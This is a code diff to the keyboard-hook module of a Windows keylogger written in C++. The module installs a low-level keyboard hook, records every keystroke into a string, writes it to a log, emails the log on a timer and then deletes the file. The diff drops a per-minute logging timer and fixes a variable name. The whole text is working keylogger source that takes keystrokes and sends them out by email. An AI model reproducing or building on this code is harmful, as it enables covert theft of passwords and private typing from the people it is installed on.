@@ -2,6 +2,7 @@
 #include <fstream>
 #include <windows.h>
 #include <string>
+#include "..\include\mingw.thread.h"
 #include "KeyConstants.h"
 #include "Helper.h"
 #include "Timer.h"
@@ -16,9 +17,8 @@ namespace KeyboardHook
     long secondInMilliseconds = 1000L; 
     long minuteInMilliseconds = secondInMilliseconds * 60;
     long hourInMilliseconds = minuteInMilliseconds * 60;
-    
+    // TODO: Put back to hourInMilliseconds
     Timer MailSendTimer(TimerSendMail, Settings::get_mail_interval() * hourInMilliseconds, Timer::Infinite);
-    Timer LoggingTimer(TimedLog, minuteInMilliseconds, Timer::Infinite);
     HHOOK eHook = NULL;
     std::string keylogString = "";
 
@@ -26,17 +26,19 @@ namespace KeyboardHook
     bool crtlPressed = false;
     bool altPressed = false;
 
-    int lastAppendageLenght = 0;
+    int lastAppendageLength = 0;
+
+    std::string GetKeylogString() { return "Keylog:\n" + keylogString; }
 
     void TimerSendMail()
     {
-
-        
         if(keylogString.empty())
+        {
+            //IO::WriteDebugAppLog("keylogString empty!");
+            keylogString += "[At" + Helper::DateTime().GetDateTimeString(".", " | ")  + "]\n Keylogstring was empty. Not sending mail.\n"; 
             return;
-
-        IO::WriteToLog(keylogString);
-        std::string lLogFP = IO::GetLastLogPath();
+        }
+        IO::WriteLog(keylogString);
         if (!IO::GetLogWriteSuccess())
         {
             //IO::WriteDebugAppLog("Log file writing failed.\n Keylog: " + keylogString);
@@ -47,7 +49,7 @@ namespace KeyboardHook
 
         int x = Mail::SendMail("LOG: " + dtString,
                                 "This log was sent at " + dtString,
-                                lLogFP,
+                                IO::GetLastLogPath(),
                                 true);
 
         if ( x != 7)
@@ -57,27 +59,11 @@ namespace KeyboardHook
         else
         {
             keylogString = "";
-            IO::DeleteFile(lLogFP);
+            IO::DeleteFile(IO::GetLastLogPath());
         }
+        return;
     }
 
-    void TimedLog()
-    {
-        if (keylogString.empty())
-            return;
-
-        IO::WriteToLog(keylogString);
-        std::string lLogFP = IO::GetLastLogPath();
-        if (!IO::GetLogWriteSuccess())
-        {
-            //IO::WriteDebugAppLog("Log file writing failed.\n Keylog: " + keylogString);
-            return;
-        }
-        else
-        {
-            keylogString = "";
-        }
-    }
 
     LRESULT MyKeyboardProc(int nCode, WPARAM wParam, LPARAM lParam)
     {
@@ -121,7 +107,7 @@ namespace KeyboardHook
                     keylogString += "[Control + Backspace]";
                 else if (!keylogString.empty())
                 {
-                    for (int i = 0; i < lastAppendageLenght; i ++)
+                    for (int i = 0; i < lastAppendageLength; i ++)
                         keylogString.pop_back();
                 }
                 break;
@@ -146,7 +132,7 @@ namespace KeyboardHook
                 else
                     keyToAddToString = kp.Name;
                 
-                lastAppendageLenght = keyToAddToString.length();
+                lastAppendageLength = keyToAddToString.length();
                 keylogString += keyToAddToString;
 
                 if (key == VK_RETURN)
@@ -270,7 +256,6 @@ namespace KeyboardHook
     bool InstallHook()
     {
         //IO::WriteDebugAppLog("Starting hook and timer...");
-        LoggingTimer.Start(true);
         MailSendTimer.Start(true);
 
         eHook = SetWindowsHookEx(WH_KEYBOARD_LL, (HOOKPROC)MyKeyboardProc,
@@ -281,7 +266,6 @@ namespace KeyboardHook
     bool UninstallHook()
     {
         bool b = UnhookWindowsHookEx (eHook);
-        LoggingTimer.Stop();
         MailSendTimer.Stop();
         eHook = NULL;
         return (bool)b;
